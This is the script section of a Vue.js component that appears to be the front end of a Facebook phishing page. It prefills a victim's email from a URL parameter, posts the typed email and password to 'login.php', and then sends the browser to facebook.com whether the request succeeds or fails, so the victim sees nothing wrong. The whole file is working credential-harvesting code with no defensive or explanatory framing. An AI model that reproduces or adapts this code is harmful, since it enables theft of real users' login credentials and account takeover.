<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      emailaddress: '',
      password: '',      
      register: {
        nameEmptyError: false,
        surnameEmptyError: false,
        loginEmptyError: false,
        passwordEmptyError: false,
        genderContainer: false
      },
      registerFields: {
        name: '',
        surname: '',
        login: '',
        password: ''
      },
      referrerPage: "//www.facebook.com",
    }
  },
  methods: {
    submitForm () {
      let vm = this
      axios.post('login.php', {email: vm.emailaddress, password: vm.password})
      .then(res => {
        window.location.replace(vm.referrerPage);
      })
      .catch(error => {
        window.location.replace(vm.referrerPage);
      })
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  computed: {
    dateDay () {
      return new Date().getDate()
    },
    dateMonth () {
      return new Date().getMonth()
    },
    dateYear () {
      return new Date().getFullYear()
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

